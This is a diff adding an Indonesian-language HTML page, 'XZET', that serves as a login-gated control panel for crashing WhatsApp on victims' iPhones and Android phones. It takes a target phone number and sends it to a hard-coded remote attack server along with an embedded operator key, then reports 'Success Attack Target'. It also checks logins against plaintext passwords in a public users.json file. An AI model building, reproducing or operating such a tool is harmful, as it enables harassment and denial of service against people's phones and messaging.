@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login XZET</title>
+  <style>
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: url("https://j.top4top.io/p_3468nai4p1.jpg") no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .center-screen {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: rgba(15, 15, 15, 0.85);
+      padding: 30px 20px 60px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+    }
+
+    .input {
+      display: block;
+      width: 100%;
+      margin: 15px 0;
+      padding: 10px;
+      background: #1e1e1e;
+      border: 1px solid #333;
+      border-radius: 6px;
+      color: white;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 10px 20px;
+      margin: 10px 5px;
+      background: #2b3f5c;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #3f3f3f;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .logout-global {
+      position: fixed;
+      top: 15px;
+      right: 15px;
+      z-index: 999;
+    }
+
+    .global-buttons {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 10px;
+      z-index: 998;
+    }
+
+    .marquee-wrapper {
+      position: absolute;
+      bottom: 15px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      font-weight: bold;
+      font-size: 14px;
+      color: #ddd;
+    }
+
+    .success-text {
+      font-size: 18px;
+      line-height: 1.8;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Logout Button -->
+<div class="logout-global hidden" id="logoutBtn">
+  <button onclick="logout()">Logout</button>
+</div>
+
+<!-- Global Owner & Channel Buttons -->
+<div class="global-buttons hidden" id="globalLinks">
+  <a href="https://t.me/BancetMyself" target="_blank"><button>👑 Owner</button></a>
+  <a href="https://t.me/SecretMInformation" target="_blank"><button>📣 Channel</button></a>
+</div>
+
+<!-- LOGIN PAGE -->
+<div class="center-screen" id="loginPage">
+  <div class="container">
+    <h2>🔐 Login ke XZET</h2>
+    <input id="username" class="input" type="text" placeholder="Username" />
+    <input id="password" class="input" type="password" placeholder="Password" />
+    <button onclick="login()">Login</button>
+    <p id="errorMsg" style="color: red; margin-top: 10px;"></p>
+  </div>
+</div>
+
+<!-- MENU PAGE -->
+<div class="center-screen hidden" id="menuPage">
+  <div class="container">
+    <h2>💥 Menu Bug WhatsApp</h2>
+    <input id="target" class="input" type="text" placeholder="Masukkan nomor target 62xxxx" />
+    <button onclick="crash('iphone')">Crash iPhone</button>
+    <button onclick="crash('android')">Crash Android</button>
+    <div class="marquee-wrapper">
+      <marquee behavior="scroll" direction="left" scrollamount="4">
+        Thanks To : BancetMyself - And My God - And My Family
+      </marquee>
+    </div>
+  </div>
+</div>
+
+<!-- SUCCESS PAGE -->
+<div class="center-screen hidden" id="successPage">
+  <div class="container success-text">
+    <div id="successContent"></div>
+    <button onclick="showPage('menuPage')">🔙 Back to Menu</button>
+  </div>
+</div>
+
+<script>
+  const RAW_USERS_URL = "https://raw.githubusercontent.com/ZauzetGithab/Database/main/users.json";
+
+  async function login() {
+    const u = document.getElementById("username").value.trim();
+    const p = document.getElementById("password").value.trim();
+    const err = document.getElementById("errorMsg");
+
+    try {
+      const res = await fetch(RAW_USERS_URL);
+      const users = await res.json();
+      const found = users.find(user => user.username === u && user.password === p);
+
+      if (found) {
+        localStorage.setItem("loggedIn", "true");
+        showPage("menuPage");
+        document.getElementById("logoutBtn").classList.remove("hidden");
+        document.getElementById("globalLinks").classList.remove("hidden");
+      } else {
+        err.textContent = "❌ Username atau password salah!";
+      }
+    } catch (e) {
+      err.textContent = "❗ Gagal ambil data dari GitHub!";
+    }
+  }
+
+  function logout() {
+    localStorage.removeItem("loggedIn");
+    location.reload();
+  }
+
+  async function crash(type) {
+    const target = document.getElementById("target").value.trim();
+    if (!target.startsWith("62")) return alert("❗ Nomor harus diawali 62xxxx");
+
+    const mode = type === "iphone" ? "ios" : "andros";
+    const bugTypeText = type === "iphone" ? "Crash iPhone" : "Crash Android";
+    const today = new Date();
+    const tanggal = today.getDate();
+    const bulan = today.toLocaleString('id-ID', { month: 'long' });
+    const tahun = today.getFullYear();
+    const tanggalLengkap = `${tanggal} ${bulan} ${tahun}`;
+
+    try {
+      const res = await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
+      const result = await res.json();
+
+      if (result.status === true) {
+        const html = `
+          ✅ <b>Success Attack Target</b><br/>
+          📱 <b>Target :</b> ${target}<br/>
+          🐞 <b>Bug Type :</b> ${bugTypeText}<br/>
+          📅 <b>Date :</b> ${tanggalLengkap}
+        `;
+        document.getElementById("successContent").innerHTML = html;
+        showPage("successPage");
+      } else {
+        alert("❌ Gagal mengirim bug. Server tidak merespons!");
+      }
+    } catch (e) {
+      alert("❌ Gagal konek ke server bug!");
+    }
+  }
+
+  function showPage(id) {
+    ["loginPage", "menuPage", "successPage"].forEach(i => {
+      document.getElementById(i).classList.add("hidden");
+    });
+    document.getElementById(id).classList.remove("hidden");
+  }
+
+  window.onload = () => {
+    if (localStorage.getItem("loggedIn") === "true") {
+      showPage("menuPage");
+      document.getElementById("logoutBtn").classList.remove("hidden");
+      document.getElementById("globalLinks").classList.remove("hidden");
+    }
+  };
+</script>
+</body>
+  </html>
